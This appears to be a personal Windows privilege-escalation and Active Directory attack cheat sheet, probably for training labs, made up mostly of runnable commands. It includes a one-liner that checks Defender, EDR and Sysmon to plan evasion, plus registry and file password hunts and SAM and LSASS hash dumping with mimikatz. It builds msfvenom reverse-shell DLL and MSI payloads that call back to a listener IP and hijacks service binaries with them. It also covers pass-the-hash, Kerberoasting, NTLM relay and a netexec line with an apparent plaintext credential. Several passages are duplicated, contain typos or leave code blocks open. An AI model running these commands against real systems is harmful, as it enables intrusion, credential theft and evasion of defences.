https://github.com/itm4n/FullPowers?ref=benheater.com
Recover default privilege set of a service account


| Attack Vector               | High-Level Technique                                                   | Tools/Notes                                             |
| --------------------------- | ---------------------------------------------------------------------- | ------------------------------------------------------- |
| **Enumeration**             | Gather OS, network, user & config info                                 | systeminfo, WMIC, PowerUp, Seatbelt                     |
| **Credential Harvesting**   | Dump SAM/HIVE, search files/registry for passwords                     | pwdump/samdump2, mimikatz, reg query, findstr           |
| **Misconfiguration Abuse**  | Exploit writable folders, unquoted service paths, $PATH hijack         | icacls, accesschk, PowerUp                              |
| **Service & Process Abuse** | Hijack or replace binaries, DLL injection, runas misuse                | sc.exe, RottenPotato, JuicyPotato, PrintSpoofer         |
| **Feature Abuse**           | Leverage MSI (AlwaysInstallElevated/CustomActions), WSL, shadow copies | msiexec, vssadmin/diskshadow, WSL commands              |
| **Token & Impersonation**   | Duplicate/manipulate tokens to gain higher privileges                  | Incognito, RottenPotato, JuicyPotato, FullPowers        |
| **Vulnerability Exploits**  | Target unpatched kernel/network/CVE vulnerabilities                    | Metasploit modules, custom exploits (EternalBlue, etc.) |
Checklist:
https://steflan-security.com/windows-privilege-escalation-cheat-sheet/



NEW:

```

$u=(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA;$d=(Get-MpPreference).DisableRealtimeMonitoring;$c=$ExecutionContext.SessionState.LanguageMode;$a=if((Get-AppLockerPolicy -Effective -EA SilentlyContinue).RuleCollections.Count -gt 0){'On'}else{'Off'};$l=(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA SilentlyContinue).RunAsPPL;$e=(Get-Process -EA SilentlyContinue|?{$_.Name -match 'carbon|crowd|sentinel|cylance|cortex|tanium'}).Name-join',';$s=if(Get-Service Sysmon* -EA SilentlyContinue){'Yes'}else{'No'};echo "UAC:$u|Defender:$(if($d){'OFF'}else{'ON'})|CLM:$c|AppLocker:$a|LSASS:$l|EDR:$e|Sysmon:$s"


```


If UAC:
```


```
## Key things to check:

| Check            | Why It Matters             |
| ---------------- | -------------------------- |
| UAC              | Can you elevate?           |
| Defender         | Will payloads get caught?  |
| CLM              | Is PowerShell restricted?  |
| AppLocker        | Are executables blocked?   |
| LSASS Protection | Can you dump creds?        |
| EDR              | What's watching?           |
| Sysmon           | Is activity being logged?  |
| PS Logging       | Are commands recorded?     |
| Credential Guard | Is LSASS virtualized?      |
| SMB Signing      | Can you relay?             |
| WinRM            | Can you PS remote?         |
| Cached Creds     | Offline cracking possible? |
Notes:
* Make script for listing other user's privileges on a box during enum
* You can use Mimikatz offline to crack LSASS DMP file
* `SYSTEM`, `SAM`, and `SECURITY` registry hives
* C:\Windows\Temp is safe to upload, because BUILTIN\Users group has write access

Remember to use tools like psexec, evil-winrm, GetuserSPNs (see HTB/Active)

Note: If for whatever reason you can't find a way to priv esc, consider running SharpHound on the box or pivoting back to the services you exploited to get into the box.

| Tool                                                                                                     | Description                                                                                                                                                                                                                                                                                                               |                                                    |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                                                                                             | <br>Seatbelt.exe -group=all -full > output.txt<br> |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)                                                                                                          |                                                    |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                                                                                         |                                                    |
| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | C# version of PowerUp                                                                                                                                                                                                                                                                                                     |                                                    |
| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                                                                                                  |                                                    |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                                                                                         |                                                    |
| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                                                                                                    |                                                    |
| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more                                                                             |                                                    |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG is a tool based on the output of Windows’ `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported                 |                                                    |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |                                                    |
|                                                                                                          |                                                                                                                                                                                                                                                                                                                           |                                                    |

Precompiled binaries:
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

**Basic Info Gathering:**
* `arp -a` 
* `route print
* Win Defender status
	* `Get-MpComputerStatus` 	
* List Applocker rules
	* `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
* Test Applocker rules
	* `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`
* List scheduled tasks
	* `tasklist /svc`
gmsa search:
```
Get-ADServiceAccount -Filter * -Properties * | Select SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordInterval,ServicePrincipalNames
```

```
echo %USERNAME% || whoami
$env:username
whoami /priv
whoami /groups
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
$env:usernadsc
net accounts
net user administrator
net user admin
net user %USERNAME%
net localgroup
Get-LocalGroup | ft Name
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
* `arp -a` 
* `route print
* Win Defender status
	* `Get-MpComputerStatus` 	
* List Applocker rules
	* `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
* Test Applocker rules
	* `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`
* List scheduled tasks
	* `tasklist /svc`

nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
netstat -ano
net share
powershell Find-DomainShare -ComputerDomain domain.local
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

Default writable folders:
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp

### SAM and SYSTEM files
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
Generate a hash file for John using `pwdump` or `samdump2`.
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt

### HiveNightmare

> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user

Check for the vulnerability using `icacls`
C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!

Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.
mimikatz> token::whoami /full

# List shadow copies available
mimikatz> misc::shadowcopies

# Extract account from SAM databases
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# Extract secrets from SECURITY
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY


### LAPS Settings

Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.

- LAPS Enabled: AdmPwdEnabled
- LAPS Admin Account Name: AdminAccountName
- LAPS Password Complexity: PasswordComplexity
- LAPS Password Length: PasswordLength
- LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*


Search passwords in SMB Shares: [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini


Search registry for key names and passwords

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


Unattend files

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml


Display the content of these files with `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`.


### IIS Web config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config


Other files:
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b






```

Windows command reference
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands

```cmd-session
tasklist /svc
```

* smss.exe (Session Manager Subsystem)
* csrss.exe (Client Server Runtime Subsystem)
* winlogon.exe (WinLogon)
* LSASS (Local Security Authority Subsystem Service)
* svchost.exe (Service Host)

Check  `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup`
- Sometimes users will have these items for multiple machines as part of their roaming profile
System account is default service account which has the highest 
Groups can belong to other groups

To escalate from an admin user to full system privileges, you can use PsExec

Priv esc tools:
* PowerUp
	* . .\PowerUp.ps1
	* Invoke-AllChecks
* SharpUp
	* .\SharpUp.exe
* Seatbelt
	* .\Seatbelt.exe NonStandardServices
	* .\Seatbelt.exe all
	* ./Seatbelt.exe -group=all 
* winPEAS
	* winPeas.exe userinfo
* accesschk.exe 
	* May require gui popup. Use older option for /accepteula command if needed


High level priv esc strategy
winPEAS -> PowerUp -> Seatbelt
Reg queries -> Directory searches

**Kernel Exploits**:
	- systeminfo
		- Searchsploit for kernel version
		- Google/Github
	- Windows Exploit Suggester
	- https://github.com/bitsadmin/wesng
	- Precompiled Kernel Exploits
		- https://github.com/SecWiki/windows-kernel-exploits
	- Watson:
		- https://github.com/rasta-mouse/Watson
		- python wes.py /tools/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
	When you run kernel exploits you run the exploit and specify the program you want to run like a rev shell
	
**Service Exploits**:
	- Insecure Service Properties
		- If our user can change the config of a service that runs with System privileges, we can change the executable the service uses to one of our own
		- `If you can change a service config, but can't stop/start the service,` you `may not be able to escalate privileges`
		- You can find in winpeas that you can modify a service, then use accesschk to confirm if needed
			- `SERVICE_CHANGE_CONFIG`
			- `SERVICE_START`
			- `SERVICE_STOP`
			- `sq qc <service>` to confirm what it does
				- Confirm start type and start name for privilege status
				- `sc query <service>` to confirm current state
				
* **Weak Registry Permissions**
	- The Windows Registry store entries for each service
		- Registry entries have ACLs, if the ACL is misconfigured it might be possible to edit the service config even if we can't modify the service itself
		- Confirm access with powershell or accesscheck
		- `Get-Acl HTLM:\System\CurrentControlSet\Services\regsvc | Format-List`
		- `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
			- You may see your group in the list. Verify it
			- `.\accesschk.exe /accepteula -ucqv user regsvc`
			- Check current values:
				- `reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc`
		* `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
		* net start regsvc
	* Always check who the object is being executed by
	- `Unquoted Service Path`
		- C:\Program Files\Unquoted Path Serice\Common Files\unquotedpathservice.exe
			- Checks for Program.exe -> Unquoted.exe  -> Common.exe -> [application]
	- `Insecure Service Executables`
		- If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.
			- Winpeas may show it as Interesting overwritable file
	* copy /Y C:\PrivEsc\reverse.exe "C:\filepath\file"
	* net start [service] 
	
* **DLL Hijacking**
	* Often a service will load from a library (DLL). It's executed as the service that loaded it
		* If loaded with absolute path, it might be possible to escalate privs if that DLL is writable by our user
	* More common: DLL is missing from system, user has write access to a dir within the PATH that Windows searches for DLLs in
	* Initial detection of vuln services is difficult and manual
	* Check executable service location, run ProcMon with admin privileges
		* Stop/clear current capture, Ctrl + L to open filter, add new filter for process name is [executable]
			* Deselect Registry Activity, Select Show Network activity
			* Start the service -> net start service
			* Find name not found results
				* Focus on directories that would be writable on target system
				* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o /tools/hijackme.dll`
				* net stop [service] -> net start [service]
* **AutoRuns**
	* Windows can be configured to run commands at startup, with elevated privileges.
		* Configured in the Registry. If you can write to an AutoRun executable && restart system, you may be able to priv esc
		* Query registry for list of all auto run 
		* reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 	
		* `.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\[program.exe]`
		* Overwrite file with shell, restart server
			* copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"
			* [Sometimes Windows will run it as the last user that was logged on. You may need to logout, then restart]
* **AlwaysInstallElevated**
	* MSI files are package files used to install application, usually w/ perms of user installing. Sometimes they are run with elevate privileges. 
	* Only true if two registry settings are enabled
		* "AlwaysInstallElevated" must be set to 1 for user & local machine
		* `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
		* `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
			* Query registry if shown true:
				* `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
				* `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
		* `msfvenom -p windows\x64\shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o /tools/reverse.msi`
			* `msiexec /quiet /qn /i reverse.msi`
* **Passwords**
	* Query registry for keys and values that contain "password". !Lots of findings
		* `reg query HKLM /f password /t REG_SZ /s`
		* `reg query HKCU /f password /t REG_SZ /s`
		* `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
	* Spawn a shell with the found credentials
		* `winexe -U 'admin%password123' //192.168.1.22 cmd.exe`
			* `winexe -U 'admin%password123 --system //192.168.1.22 cmd.exe`
			*
* **Saved Creds**
	* Runas command allows users to run commands w/ privs of other users
		* `cmdkey /list` 
		* `runas /savecred /user:admin C:\Reverseshell.exe`

```
## enumerate all accessible shortcut (.lnk) files on system and examine them for "runas"
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
> ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file |
Select-String runas }
```
* **Configuration Files**
	* `dir /s *pass* == *.config*`
	* `findstr /si password *.xml *.ini *.txt`
		* `findstr /si "password" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.docker-compose *.pem *.cer *.key *.crt *.gitignore *.svn *.html *.htm *.vb *.pl *.rb > password_results.txt`
		* `findstr /si /s "password" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.docker-compose *.pem *.cer *.key *.crt *.gitignore *.svn *.html *.htm *.vb *.pl *.rb`
			* Make sure you also look for admin, usernames, etc.
				* Highlight user directories, /tmp or suspicious service dirs
		
* **SAM**
	* If you can read SAM/SYSTEM, you can extract the hashes
		*  `C:\Windows\System32\config directory
		*  `C:\Windows\System32\config\RegBack`
		* `C:\Windows\Repair`
			* samdump/pwdump(creddump7 suite)
			* python2 pwdump.py /tools/SYSTEM /tools/SAM
				* first part of hash is deprecated. Second is NTLM hash
					* 31d6 hash is empty string. No pw or disabled user
					* Once you have hash, you can pass it
						* `pth-winexe -U 'admin%firsthash:secondhash' //192.168.1.22 cmd.exe`
						* `pth-winexe --system -U 'admin%firsthash:secondhash' //192.168.1.22 cmd.exe`
						* See also, wmiexec, psexec, smbexec, cme, wce
* **Scheduled Tasks**
	* Tasks at specific times, events and usually at priv level of creator. Find scheduled task, see if it's a script and accesscheck the script.
	* Not always easy to find as low privilege user
		* https://github.com/markwragg/PowerShell-Watch
	* `schtasks /query /fo LIST /v`
	* `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State`
	
* **Insecure GUI Apps**
	* There are often numerous ways to spawn cmd prompts within GUI apps
	* `tasklist /V | findstr [program.exe]`
		* In program (if possible)-> File Explorer-> file://c:/windows/system32/cmd.exe
* **Startup Apps**
	* Users & Windows define startup apps. If we can create files in this, place a rev shell
		* `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
			* Must be shortcut (link files)
	* Windows -> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
* **Installed applications**
	* `.\seatbelt.exe NonstandardProcesses`
		* Search exploitDB thoroughly for service specific vulns
* **Token Impersonation**
	* SEimpersonate
		* Potatoes/PrintSpoofer

* getsystem (Named Pipes & Token Duplication)
	* Access tokens are objects that store a user's identity and privileges
		* Primary access token: Created at login, bound to user session. Primary access token is copied and attached to new process when one is created
		* Impersonation Access Token: Created when a process/thread needs to temp. run with the security context of another user
	* Token Duplication: Processes/threads may duplicate their access tokens. Impersonation tokens can be duplicated into primary access tokens this way
		* If we can inject into a process, we can duplicate the access token of the process and spawn a separate process with the same privileges
	* `getsystem` in metasploit will run each of these methods

Misc notes:
* To escalate from an admin user to full system privileges, you can use PsExec
* `whoami /priv` - disabled is irrelevant. 
	* The SEImpersonatePrivilege grants the ability to impersonate any access tokens it obtains. JuicyPotato
	* SeAssignPrimaryPrivilege similar - JuicyPotato
		* SeBackUpPrivilege grants read access to all objects on the system, regardless of ACL
		* Could gain access to sensitive files/extract hashes from registry
	* SeRestorePrivilege grants write access to all objects
		* Modify service binaries
		* Overwrite DLLs used by SYSTEM processes
		* Modify registry settings
	* SeTakeOwnershipPrivilege lets user take ownership over any object.
		* Take ownership, modify ACL to grant write access. Then see SeRestorePriv paths*
	* SeTcbPrivilege
	* SeCreateTokenPrivilege
	* SeDebugPrivilege (used by getsystem)

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue


Lain's checklist:

**Windows Privilege Escalation enumeration commands and tools**

- whoami /priv
- whoami /groups
- systeminfo
- cd C:\
- look into user documents or downloads
- cd  C:\inetpub
- cd “C:\Program Files”
- cd “C:\Program Files (x86)”
- Recycle Bin: cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001' (find SID of user)
- if putty is installed:

reg query **HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions**

Always check powershell history for passwords
- powershell **(Get-PSReadlineOption).HistorySavePath**
	- Get-PSReadlineOption).HistorySavePath
- **PowerUp.ps1**
- winpeas.exe

 ## Internal machine/network enumeration

- **Try everything twice if needed**
- Recycle Bin: cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001' (find SID of user)
- powershell **(Get-PSReadlineOption).HistorySavePath**   (powershell history)
- bash history
- env
- Keepass databases
- cd C:\Users\Administrator\Documents
- find config files (wp config or sth like that)
- find interesting tools
- find ssh keys
- Git enumeration
- find Database files or SQL services
- find backups of interesting file (back up of SAM and SYSTEM for example)
- Check processes see if a vulnerable software is running
- Do top ports nmap scans
- Do netstat -ano see if any interesting port is available from the inside, do port forwarding if needed
- Check for interesting groups
- Bloodhound for AD 
- Find compressed files zip, tar, rar or even jar files and extract them

 ## Lateral Movement AD

- Spray found credentials and hashes in **winrm, rdp, smb, ssh, mssql**
- Secretsdump all creds, find cleartext creds also
- Check smb shares (GPP may be possible)
- ***Go back to internal enumeration if stuck***
- Kerberoasting, Asreproasting
- Do internal kerberoasting from inside a machine if needed (Invoke-Kerberoasting)
- Do internal port scans and see if there are any internal services like a webpage, try found credentials on those
- Possibly try to check password reuse as an admin.
- Pass the hash, Pass the ticket, Overpass the hash
- Smbrelay, silver tickets
- Look for ACLs and ACEs with BloodHound or PowerView

Tools to use:

**Seatbelt**: performs a bunch of priv esc type checks
* Seatbelt.exe -group=all -full > output.txt
**Winpeas:** Winpeas
* ./winpeas.exe 
**PowerUp**
* Import-Module .\PowerUp.ps1 
* Invoke-AllChecks
**SharpUp**
* * .\SharpUp.exe
	* .\SharpUp.exe audit
	* .\SharpUp.exe HijackablePaths
	* .\SharpUp.exe audit HijackablePaths
**Jaws**
* . .\jaws-enum.ps1
**LaZagne**
* .\LaZagne.exe
**Windows Exploit Suggester**
* git clone https://github.com/bitsadmin/wesng.git; cd wesng; python3 wes.py --update
* [on host] systeminfo
* create systeminfo.txt
* python3 wes.py systeminfo.txt

**SharpHound**

**AdExplorer**

**PingCastle**

**Invoke-Kerberoast** 
* Invoke-Kerberoast -OutputFormat hashcat

**Accesschk**
* accesschk.exe -uwq "C:\Program Files"

Rubeus
.\Rubeus.exe kerberoast /user:targetuser

**PowerSploit**


**secretsdump.py**: Tool for dumping hashes/creds

- python secretsdump.py domain/username:password@targetIP

**ticketer.py**: Creates custom Kerberos tickets

- python ticketer.py -spn service/host.domain.com -user targetUser -domain domain.com -aesKey 1234567890ABCDEF

**GetUserSPNs.py**: Retrieves SPNs for Kerberoasting

- python GetUserSPNs.py domain/username:password@domain.com -request

**getTGT.py**: Requests Kerberos TGT

- python getTGT.py -spn service/host.domain.com -user targetUser -domain domain.com -aesKey 1234567890ABCDEF

**wmiexec.py**: Executes commands via WMI

- python wmiexec.py domain/username:password@targetIP -target-ip 192.168.1.100

**ntlmrelayx.py**: Performs NTLM relay attacks

- python ntlmrelayx.py -t targetIP -smb2support

**getST.py**: Requests Kerberos ST

- python getST.py -spn service/host.domain.com -impersonate targetUser -domain domain.com -aesKey 1234567890ABCDEF

**reg.py**: Remote registry manipulation

- python reg.py domain/username:password@targetIP query HKLM\Software

**smbclient.py**: Interacts with SMB shares

- python smbclient.py domain/username:password@targetIP -outputfile output.txt

**smbserver.py**: Sets up SMB file-sharing server

- python smbserver.py shareName sharePath -outputfile serverLog.txt

**DumpNTLMInfo.py**: Extracts NTLM info from SMB

- python DumpNTLMInfo.py targetIP -port 445

**findDelegation.py**: Finds misconfigured AD delegations

- python findDelegation.py domain/username:password@domain.com

**mssqlclient.py**: Connects to MS SQL Server

- python mssqlclient.py domain/username:password@targetIP -target-ip 192.168.1.100

**mssqlshell.py**: Interactive MS SQL shell

- python mssqlshell.py domain/username:password@targetIP

**registry-read.py**: Reads remote registry values

- python registry-read.py domain/username:password@targetIP HKLM\Software\Microsoft\Windows\CurrentVersion

**net.py**: Queries/manipulates network resources

- python net.py domain/username:password@targetIP user

**rbcd.py**: Resource-Based Constrained Delegation attacks

- python rbcd.py domain/username:password@domain.com

**ntfs-read.py**: Reads NTFS filesystems remotely

- python ntfs-read.py -path /mnt/path/to/ntfs

**ldap_shell.py**: Interactive LDAP shell

- python ldap_shell.py domain/username:password@domain.com -dc-ip 192.168.1.100

**lookupsid.py**: Converts SIDs to usernames and vice versa

- python lookupsid.py domain/username:password@targetIP

**samrdump.py**: Dumps info from SAMR interface

- python samrdump.py domain/username:password@targetIP

**tstool.py**: Tests Kerberos tickets/SPNs

- python tstool.py domain/username:password@domain.com -spn service/host.domain.com

**describeTicket.py**: Describes/decrypts Kerberos tickets

- python describeTicket.py -ticket ticket.kirbi

**GetADComputers.py**: Queries AD for computer objects

- python GetADComputers.py domain/username:password@domain.com

**GetLAPSPassword.py**: Extracts LAPS passwords from AD

- python GetLAPSPassword.py domain/username:password@domain.com

**dacledit.py**: Edits DACLs of AD objects

- python dacledit.py domain/username:password@domain.com -objectDN "CN=Object,OU=Test,DC=domain,DC=com" -operation read

**owneredit.py**: Changes AD object owner

- python owneredit.py domain/username:password@domain.com -objectDN "CN=Object,OU=Test,DC=domain,DC=com" -newOwner "CN=NewOwner,OU=Test,DC=domain,DC=com"




Netexec
* netexec ldap 10.129.167.176 -u Olivia -p ichliebedich --bloodhound --collection All --dns-server 10.129.167.176








```powershell-session
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```


```

Check user recycle bin:

```
$sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value; cd "C:\`$Recycle.bin\$sid"
```

```
type((Get-PSReadlineOption).HistorySavePath)
```


Watson 4.0 https://github.com/ZumiYumi/saiyan/blob/main/scripts/exploits/windows/Watson.exe



this is what i use for now
```pwsh
$myIP="192.168.45.226"
powershell iwr -uri http://$myIP/powerview.ps1 -Outfile powerview.ps1; Import-Module .\powerview.ps1

Get-LocalUser
#list of users
net user username
#get information on a user
Get-LocalGroup
#list of groups
Get-LocalGroupMember Users
#Here you can find who's a member of a specific group

whoami
whoami /priv
whoami /groups
ipconfig /all
arp -a
systeminfo
route print
reg query HKCU\Software /s /f "PuTTY"
#recursively search for putty keys
netstat -ano
netstat -ano | findstr LISTENING
schtasks /query /fo LIST /v > list.txt
Get-History
type((Get-PSReadlineOption).HistorySavePath)
#do above for each user you have access too
Get-Process

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Acl "HKLM:\System\CurrentControlSet\Services\regsvc | Format-List"
Get-ItemProperty -Path 'HKCU:\Software' -Name '*PuTTY*' -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "unattended.xml" -File -Recurse -ErrorAction SilentlyContinue
